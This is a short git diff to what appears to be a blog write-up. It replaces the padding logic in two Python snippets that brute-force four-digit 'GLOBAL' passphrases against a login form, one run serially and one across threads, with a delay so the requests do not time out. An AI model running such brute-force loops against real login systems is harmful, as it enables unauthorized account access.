@@ -101,8 +101,7 @@ I could write a quick wrapper to the request such that it would try all combinat
 
 ```python
 for i in range(10000):
-	padding = "0" * (4 - len(str(i)))
-	attempt = padding + str(i)
+	attempt = "%04d" % i # h/t /u/paulschreiber
 	data = {
 	  'user': 'GLOBAL' + attempt,
 	  'password': 'NULL',
@@ -132,8 +131,7 @@ def brute_force_pass(attempt):
 		print('Valid passphrase found: GLOBAL%s' % attempt)
 
 for i in range(10000):
-	padding = "0" * (4 - len(str(i)))
-	attempt = padding + str(i)
+	attempt = "%04d" % i # h/t /u/paulschreiber
 	threading.Thread(target=brute_force_pass, args=[attempt]).start()
 	time.sleep(0.05) # sleep for 1/20th of a second so we don't start timing out or running out of sockets
 ```
